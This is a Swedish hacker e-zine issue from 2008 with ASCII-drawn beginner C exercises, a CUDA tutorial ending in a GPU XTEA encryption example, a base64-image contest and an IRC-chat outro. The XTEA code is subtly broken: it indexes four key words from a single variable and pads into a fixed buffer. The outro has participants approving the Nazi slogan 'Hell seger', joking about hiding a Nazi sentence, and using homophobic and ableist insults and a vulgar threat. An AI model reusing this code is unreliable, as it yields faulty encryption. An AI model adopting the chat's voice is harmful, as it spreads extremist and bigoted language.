+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Välj ett land, USA eller Sverige:               |^|
+      |[Sverige]                                       | |
+      |Sverige är ett avlångt land där det finns många | |
+      |snälla människor. De två största sjöarna är[...]| |
+      |                                                | |
+      |                                                | |
+      |Tryck på valfri tangent för att fortsätta...    |v|
+      .--------------------------------------------------.
+
+        Förklaring: Låt användarna skriva in Sverige eller USA. Beroende på
+        vad användarna skriver in ska du mata ut information om det valda landet
+        Om användarna matar in någonting annat än Sverige eller USA ska du ge
+        dem instruktionerna igen.
+        Använd dig av en switch-sats.
+
+Uppgift tre
+-----------
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Användarnamn: [Ryttger]                         |^|
+      |Lösenord: [hezt]                                | |
+      |          _          ____    \                  | |
+      |         / \        /   ¤\  / \                 | |
+      |        /   \      |  ¤   |  / \_               | |
+      |       /     \      \  ¤ /    /                 | |
+      |      /  ___  \      |  |                       | |
+      |       | |.|  |      |  |                       | |
+      | ______| | |  |______|  |__________             | |
+      |                                                | |
+      |                                                | |
+      |Tryck på valfri tangent för att fortsätta...    |v|
+      .--------------------------------------------------.
+
+        Förklaring: Skriv din egen inloggning, när du skrivit in rätt lösenord
+        ska du rita ut ditt fina hus med ett stort fruktträd! 
+        (OBS: Mycket viktigt med huset och fruktträdet, glöm inte solen uppe
+        till höger, den ska vara färgad gul, solstrålarna röda!)
+        Om användaren skriver in fel lösenord och/eller användarnamn ska du
+        säga åt dem att skaffa sig korrekta uppgifter.
+
+Stjärnuppgift ett
+-----------------
+
+      .--------------------------------------------------.
+      | cmd.exe                                   _ [] x |
+      |--------------------------------------------------|
+      |Är du snygg?                                    |^|
+      |[jA]                                            | |
+      |Okej                                            | |
+      |Tryck på valfri tangent för att fortsätta...    | |
+      |                                                | |
+      |                                                | |
+      |                                                |v|
+      .--------------------------------------------------.
+
+        Förklaring: Gör ett program som frågar om någon är snygg.
+        Oavsett om användaren svarar Ja, JA, ja eller jA eller liknande ska
+        du svara "okej".
+        Oavsett om användaren svara nej, Nej, nEj, NeJ eller liknande 
+        kombinationer ska du svara: "MEN STICK DÅ!".
+
+================================================================================
+0x05 - Introduktion till CUDA                                             sasha^
+================================================================================
+
+Vad är CUDA?
+============
+
+CUDA (Compute Unified Device Architecture) är ett API mot GPU på Nvidias
+grafikkort. Den nuvarande versionen är en abstraktion jämfört med tidigare
+assembler-liknande gränssnitt. Själva biblioteket är uppdelat i två delar, en
+som har direkt tillgång att alla kernelfunktioner och en enklare del, vilken
+denna guide kommer att behandla. Biblioteket har stöd för C, matlab m.m.
+Alla kodexempel i den här guiden är skrivna i C.
+
+Användningsområden
+==================
+
+I vissa fall kan CUDA ge en oerhörd prestandaökning, i andra fall en
+prestandaminskning. Resultatet beror främst på hur lämpat problemet är att
+lösas m.h.a. pararellprogrammering. För att ett program ska kunna få en
+prestandahöjning måste det designas rätt. Tumregeln är att det ska förekomma
+ett lågt antal minnesoperationer och att beräkningsintensiteten ska vara hög.
+Här kommer ett par exempel postade av användare på Nvidias officiella forum:
+
+Hashmetoder - Ökning mellan 10-20x
+RNG - Ökning upp till 150x
+Video Codecs - Ökning med 12x
+
+Ökningarna beror främst mycket på hur optimerad koden är och vilken hårdvara
+man jämför emot. Vissa av resultaten är missvisande men de ger ändå en ganska
+bra bild på vad du kan förvänta dig.
+
+
+Stöd
+====
+
+CUDA stöds endast på vissa serier av Nvidias grafikkort, bl.a. 8800- och
+9800-serien. Det finns även lösningar vid större behov av hårdvara (TESLA).
+Drivrutiner finns för de flesta plattformar, Vista planeras inom en snar
+framtid. För att utveckla kod behöver du inte äga ett kompatibelt kort, något
+som vi återkommer till senare.
+
+Installation
+============
+
+För att programmera med CUDA så behöver du ladda ner ett toolkit samt SDK. Om
+du använder MSVS 2008 måste du installera version 1.0 av SDK, annars fungerar
+version 1.1.
+
+http://www.nvidia.com/object/cuda_get.html
+
+Välj ditt operativsystem och installera de båda. Om du använder Windows Vista
+fungerar Xp-versionen felfritt. Du måste konfigurera din kompilator efter
+installationen för att den ska hitta vissa kataloger, något som beskrivs vid
+användning av MSVS i den här guiden. De delar av koden som använder
+CUDA-funktioner måste kompileras med nvcc, en kompilator som följer med SDKt.
+Även detta måste ställas in på ett korrekt sätt så att du lägger till
+objektfilerna till ditt projekt efter kompileringen. Det mesta sker automatiskt
+om du väljer att arbeta med detta projektet:
+http://i.h4x.se/~proffx/hacktivism/CUDA.zip
+
+Den bifogade koden är XTEA-algoritmen som presenteras senare. För att allt ska
+fungera måste du göra ett par inställningar i MSVS.
+
+1. Öppna CUDA-projektet och Tools->Options->Projects And Solutions->VC++
+Directories.
+
+2. Under "Include files" lägger du till installationskatalog\NVIDIA CUDA SDK
+\common\inc
+
+3. Under "Library files" lägger du till installationskatalog\NVIDIA CUDA SDK
+\common\lib
+
+I mitt fall var installationskatalogen "C:\Program\NVIDIA Corporation".
+
+Om du inte har tillgång till ett kompatibelt grafikkort kan du kompilera under
+EmuDebug eller EmuRelease, vilket innebär att all kod kommer köras på CPU med
+sämre prestanda. Dessa lägen finns förinställda i MSVS-projektet.
+
+
+Grunderna/Programdesign
+=======================
+
+Program har en kärna som anropas från CPU och exekveras på GPU. Tanken är att
+kerneln (kärnan) ska anropas flera gånger parallellt med olika indata.
+
+Kod exekveras antingen på host (CPU) eller device (GPU). På device finns ett
+flertal olika minnesområden med olika egenskaper. Det finns flera olika tillägg
+till C standardbibliotek (CUDA-API) för att beskriva funktionaliteten i kod.
+
+På device delas arbetet upp i flera block som i sin tur kör flera trådar.
+Antalet block och trådar man ska använda skiljer sig från varje program. För
+att få optimal belastning på device använder man CUDA Occupancy Calculator,
+något som är överkurs för denna artikel.
+
+
++------------------------------+
+|                              |
+| +---------+     +---------+  |
+| | 0,1 1,1 |     | 0,1 1,1 |  |
+| | 0,0 1,0 |     | 0,0 1,0 |  |
+| +---------+     +---------+  |
+|     0,0             1,0      |
+|                              |
++------------------------------+
+Visualisering av 2 block med 4 trådar i varje. Notera att vi refererar till
+alla element med koordinater.
+
+På device finns det flera minnesområden med olika egenskaper. Det globala
+minnet är åtkomstbart från både device och host men kräver ca 400-600 extra
+klockcykler att läsa/skriva ifrån, vilket bör undvikas. Det delade minnet på
+device samt de register som tillhör varje multiprocessor, bidrar knappt till
+någon fördröjning. Det finns även bandbreddsbegränsningar som skiljer sig
+markant mellan olika hårdvara, samt användningen av pinned memory.
+
+För att undvika minneskonflikter bör man använda särskilda storlekar på data,
+te.x. att all indata paddas för villkoret strlen(data) % 8 == 0. Detta medför
+en problematik som hanteras i den officiella guiden (se källor).
+
+Programmering
+=============
+
+Avsnitt som behandlar det specifika för CUDA.
+
+Nyckelord för funktioner
+------------------------
+
+nyckelord return-datatyp funktion(argument); -> __device__ void print(void);
+
+__host__
+Exekveras på host, endast anropbar från host. Ekvivalent med att
+deklarera en funktion normalt.
+
+__device__
+Exekveras på device, endast anropbar från device.
+
+__global__
+Exekveras på device, endast anropbar från host. En funktion
+deklarerad med __global__ kallas även för kernel.
+
+Nyckelord för variabler
+------------------------
+
+nyckelord datatyp namn; -> __device__ int iNum;
+
+__device__
+Lagras i det globala minnet på device. Åtkomstbar för host genom
+diverse funktioner.
+
+__constant__
+Lagras i det konstanta minnet.
+
+__shared__
+Lagras i det minnet som delas inom ett trådblock, endast åkomstbar
+för trådar inom samma block.
+
+Funktioner
+----------
+
+CUDA erbjuder flera funktioner och strukturer att hantera data m.m.
+Se cutil.h för detaljerad information.
+
+void CUT_CHECK_DEVICE(void);
+
+Förbereder device, måste alltid anropas innan övrig CUDA-kod.
+
+CUDA_SAFE_CALL(cudaError_t err);
+
+Ett makro som behandlar returvärden av typen cudaError_t när _DEBUG är
+definierad. Bör alltid användas då det underlättar avlusning.
+
+void CUT_CHECK_ERROR(const char * err);
+
+Skriver ut err vid ett eventuellt fel.
+
+cudaError_t cudaMalloc(void** devPtr, size_t count);
+
+Allokerar count bytes på device och pekar devPtr till utrymmet.
+
+cudaError_t cudaMemcpy(void* dst, const void* src, size_t count, cudaMemcpyKind
+kind);
+
+Kopierar count bytes från src till dst. Giltiga värden för kind:
+cudaMemcpyHostToHost, cudaMemcpyHostToDevice, cudaMemcpyDeviceToHost, eller
+cudaMemcpyDeviceToDevice.
+
+cudaError_t cudaFree(void * ptr);
+
+Friar ptr som allokerades med cudaMalloc.
+
+void __syncthreads(void); 
+
+Synkroniserar alla trådar efter läsning från det globala eller delade minnet.
+Krävs endast vid vissa specialfall.
+
+
+Datatyper
+---------
+
+Det finns flera strukturer i följande format: datatypAntal Te.x. int2, float3
+osv. Medlemmarna är x, y, z (beroende på antal). T.ex.:
+
+struct int3
+{
+   int x, y, z;
+};
+
+
+Variabler
+---------
+
+Dessa variabler är tillgängliga från kerneln.
+
+dim3 gridDim - Innehåller storleken på den aktuella grid:en (x * y = totala
+antalet block).
+
+dim3 threadDim - Innehåller storleken på trådarna (x * y = totala).
+
+uint3 blockIdx - Innehåller det aktiva blockets position.
+
+uint3 threadIdx - Innehåller den aktiva trådens position.
+
+
+Exekveringskonfiguration
+------------------------
+
+För att anropa en funktion som agerar kernel (en kernel körs på device och
+anropas från host) använder vi en exekveringskonfiguration. Anta att det här är
+prototypen för vår kernel:
+
+__global__ void kernel(void);
+
+När vi anropar den skickar vi med antalet trådar och block som kerneln kommer
+att köras i.
+
+kernel <<< grid i dim3-struktur, trådar i dim3-struktur >>> ();
+
+Grid-strukturen beskriver antalet block i formatet dim3(x, y, z) där x * y ger
+antalet block. Tråd-strukturen beskriver antalet trådar i formatet dim3(x, y,
+z) där x * y ger antalet trådar. Följande kod kommer exekvera funktionen i 2
+trådar inom ett block.
+
+kernel <<< dim3(1, 1, 1), dim3(2, 1, 1) >>> ();
+
+
+Vårt första program
+===================
+
+Då all CUDA-realterad kod måste kompileras separat så använder vi filändelsen
+.cu för funktioner på device och närliggande.
+
+//Start of host.cpp
+
+#include <stdio.h>
+
+extern "C" void test(void);
+
+int main()
+{
+   test();
+
+   getchar();
+   return 0;
+}
+
+//End of host.cpp
+
+
+//Start of device.cu
+
+#include <stdio.h>
+#include <cutil.h>
+#include <cppIntegration_kernel.cu>
+
+__global__
+void testKernel(void);
+
+extern "C" void test(void)
+{
+   CUT_CHECK_DEVICE();
+   
+   testKernel <<< dim3(1, 1, 1), dim3(1, 1, 1) >>> ();
+
+   CUT_CHECK_ERROR("Ett fel inträffade vid exekvering av testKernel");
+}
+
+__global__
+void testKernel(void)
+{
+   printf("-----------------\nBlock.x:\t%i\nBlock.y:\t%i\nThread.x:\t%i\n
+Thread.y:\t%i\n-----------------\n", blockIdx.x, blockIdx.y, threadIdx.x,
+threadIdx.y);
+}
+
+//End of device.cu
+
+Det här mycket enkla exemplet anropar funktionen test från main. test() kollar
+efter eventuella problem och exekverar sedan testKernel. I
+exekveringskonfigurationen har vi endast angivet att det totalt kommer köras en
+tråd (1 * 1). Experimentera med olika värden och kontrollera utmatning. Det
+enda vår kernel gör är att skriva ut dess block- och trådkoordinater via de
+inbyggda variablerna. När kerneln har returnerat kollar vi efter eventuella fel
+och avslutar. 
+
+XTEA i CUDA
+===========
+
+Slutligen kommer det ett mera praktiskt exempel, en implementation av XTEA i
+CUDA. Koden är kommenterad och det bör inte vara några större problem att
+förstå den. Jag har valt att padda indata för att underlätta vid valet av
+antalet trådar. En lämplig uppgift för läsaren är att göra den statiska nyckeln
+till krypteringen valbar via inmatning från användaren.
+
+Programflöde:
+
+main()
+crypt(ENCIPHER)
+cryptKernel(ENCIPHER)
+encipher()
+(tillbaka till main)
+
+crypt(DECIPHER)
+cryptKernel(DECIPHER)
+decipher()
+(tillbaka till main)
+
+//Start of host.cpp
+#include <iostream>
+#include <stdio.h>
+#include <string.h>
+
+enum eAction { ENCIPHER, DECIPHER };
+extern "C" void crypt(char * cpData, int iLen, eAction oAction);
+
+int main()
+{
+   /*
+   *Extra utrymme för att padda så att strlen(data) % 8 == 0
+   *Ingen elegant lösning på problemet
+   */
+   char data[100] = "Tjena tjena !!";
+
+   printf("Input:\t\t\t%s\n", data);
+   
+   /*
+   * Kryptera data och skriv ut resultatet
+   */
+   crypt(data, (int) strlen(data), ENCIPHER);
+   printf("Ciphertext:\t\t%s\n", data);
+
+   /*
+   * Dekryptera data och skriv ut resultatet
+   */
+   crypt(data, (int) strlen(data), DECIPHER);
+   printf("Plaintext:\t\t%s\n", data);
+
+   getchar();
+   return 0;
+}
+
+//End of host.cpp
+
+//Start of device.cu
+
+#include <stdio.h>
+#include <string.h>
+#include <cutil.h>
+
+enum eAction { ENCIPHER, DECIPHER };
+#define XTEA_KEY 123456
+
+#ifndef CUT_DEVICE_INIT
+#define CUT_DEVICE_INIT CUT_CHECK_DEVICE
+#endif
+
+/*
+* Krypterar 8 byte från data med nyckeln key
+*/
+__device__
+void encipher(unsigned long * data, unsigned long * key)
+{
+   unsigned long v0, v1, i, sum, delta;
+
+   v0 = data[0];
+   v1 = data[1];
+   sum = 0;
+   delta = 0x9E3779B9;
+
+   for(i = 0; i < 32; i++)
+   {
+      v0 += ((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + key[sum & 3]);
+      sum += delta;
+      v1 += ((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + key[sum>>11 & 3]);
+   }
+
+   data[0] = v0;
+   data[1] = v1;
+}
+
+/*
+* Dekrypterar 8 byte data från data med nyckeln key
+*/
+__device__
+void decipher(unsigned long * data, unsigned long * key)
+{
+   unsigned long v0, v1, i, sum, delta;
+
+   v0 = data[0];
+   v1 = data[1];
+   sum = 0xC6EF3720;
+   delta = 0x9E3779B9;
+
+   for(i = 0; i < 32; i++)
+   {
+      v1 -= ((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + key[sum>>11 & 3]);
+      sum -= delta;
+      v0 -= ((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + key[sum&3]);
+   }
+
+   data[0] = v0;
+   data[1] = v1;
+}
+
+/*
+* Kernel som krypterar/dekrypterar en del av cpData, baserat på tråd-id.
+*/
+__global__
+void cryptKernel(unsigned long * cpData, eAction oAction)
+{
+   __shared__ int threadId;
+   __shared__ unsigned long key;
+
+   threadId = threadIdx.x;
+   key = XTEA_KEY;
+
+   if( oAction == ENCIPHER )
+      encipher( cpData + threadId * 2, &key );
+
+   else if( oAction == DECIPHER )
+     decipher( cpData + threadId * 2, &key );
+}
+
+/*
+* Krypterar eller dekrypterar cpData och sparar resultatet i cpData
+*/
+extern "C" void crypt(char * cpData, int iLen, eAction oAction)
+{
+   CUT_DEVICE_INIT();
+
+   /*
+   * Padda cpData för iLen % 8 == 0
+   */
+   if( oAction == ENCIPHER )
+   {
+      while( iLen % 8 )
+      {
+         iLen++;
+         strcat(cpData, "a");
+      }
+   }
+
+   /*
+   * Allokera utrymme på device och kopiera ucpData_host till ucpData_device
+   */
+   char * cpData_device;
+   CUDA_SAFE_CALL( cudaMalloc( (void **) &cpData_device,
+         sizeof(char) * iLen ) );
+
+   CUDA_SAFE_CALL( cudaMemcpy( cpData_device, cpData, sizeof(char) * iLen,
+         cudaMemcpyHostToDevice) );
+
+   /*
+   * Anropa kerneln så att varje tråd arbetar med 8 byte
+   */
+   cryptKernel <<< dim3(1, 1, 1), dim3(iLen / 8, 1, 1) >>> 
+         ( (unsigned long *) cpData_device, oAction);
+   CUT_CHECK_ERROR("Ett fel inträffade vid exekvering av cryptKernel");
+
+   /*
+   * Kopiera resultatet till cpData
+   */
+   CUDA_SAFE_CALL( cudaMemcpy( cpData, cpData_device, sizeof(char) * iLen,
+         cudaMemcpyDeviceToHost) );
+
+   /*
+   * Fria allokerade utrymmen
+   */
+   CUDA_SAFE_CALL(cudaFree( cpData_device ));
+}
+
+//End of device.cu
+
+
+Slutord
+=======
+
+Jag valde att begränsa denna artikel kraftigt då CUDA är ett väldigt brett
+område. Förhoppningsvis så har jag väckt ett växande intresse hos dig. Kraften
+och möjligheterna med CUDA är stora och projektet utvecklas hela tiden, vilket
+gör det lämpligt för de flesta prestandakrävande program.
+
+
+Källor
+======
+
+"NVIDIA CUDA Programming Guide 1.0" -
+developer.download.nvidia.com/compute/cuda/1_0/
+NVIDIA_CUDA_Programming_Guide_1.0.pdf
+
+"CUDA - Wikipedia, the free encyclopedia" -
+en.wikipedia.org/wiki/CUDA
+
+"NVIDIA Forums -> CUDA GPU Computing" -
+http://forums.nvidia.com/index.php?showforum=62
+
+"CUDA Occupancy Calculator" -
+news.developer.nvidia.com/2007/03/cuda_occupancy_.html
+
+"XTEA - Extended Tiny Encryption Algorithm..." -
+www.swerat.com/forums/index.php?showtopic=911&view=findpost&p=7208
+
+
+================================================================================
+0x06 - Tävling                                                              Anon
+================================================================================
+Första person som vet vad datan representerar och mailar oss får en
+virtuell kram. Pluspoäng om datans ursprung anges.
+
+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
+fzGWfUqF/FQwHuf/2Q==
+
+
+================================================================================
+0x07 - Outro                                                                Anon
+================================================================================
+17:22 <@swestres> Vad ska slutordet ha för tema, då?
+17:22 <@Kjellkod> Hm jag vet inte. Vad tycker du? Jag tycker vi borde baka in
+att vi tar emot fler skribenter om folk vill bidra.
+17:22 <@swestres> Jag tycker vi ska skriva att zirek är gay
+17:22 <@swestres> Och definitivt flashn
+17:22 <@Kjellkod> Sen som vanligt, någon gömd nazi-mening.
+17:23 <@swestres> Vad sägs om denna loggen?
+17:23 <@Kjellkod> Vilken?
+17:23 <@swestres> DENNA!½
+17:24 <@Kjellkod> Haha nej, varför?
+17:24 <@swestres> Lätt denna
+17:24 <@Kjellkod> Hm, vafan swestres, syfte?
+17:24 <@swestres> Hell seger!
+17:24 <@swestres> Erkänn att det låter bra
+17:25 <@Kjellkod> Hell seger låter bra.
+17:25 <@swestres> Precis, jag pejstar @ forum, godkänn eller jag snedknullar 
+era mammor
+17:25 <@Sasha^> mkaaaaaaaaay 
+
+Så, så var det med den saken! Som vanligt, hckzine@gmail.com för saker!
+Oh btw, Retard failade brutalt i förra zinet, Class Program ska istället vara
+class Program.
+Lör 24 Maj 2008 23:08:20 CEST
